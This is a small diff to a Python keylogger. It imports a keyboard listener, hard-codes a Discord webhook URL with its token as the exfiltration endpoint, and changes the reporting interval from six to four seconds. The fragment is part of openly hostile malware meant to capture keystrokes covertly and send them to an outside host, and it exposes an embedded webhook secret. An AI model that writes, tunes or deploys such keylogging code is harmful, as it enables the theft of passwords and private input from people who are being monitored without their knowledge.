@@ -4,7 +4,7 @@ from pynput.keyboard import Listener
 
 
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1258568887042048000/xHbfKUrLv6zisDLcBDU5o9Zhzya28UBCCpuhQt0ZBvNvNaEwJDpS3BcwzcRvHZadP6uu'
-TIME_INTERVAL = 6  # Amount of time between each report, expressed in seconds.
+TIME_INTERVAL = 4  # Amount of time between each report, expressed in seconds.
 
 
 class Keylogger:
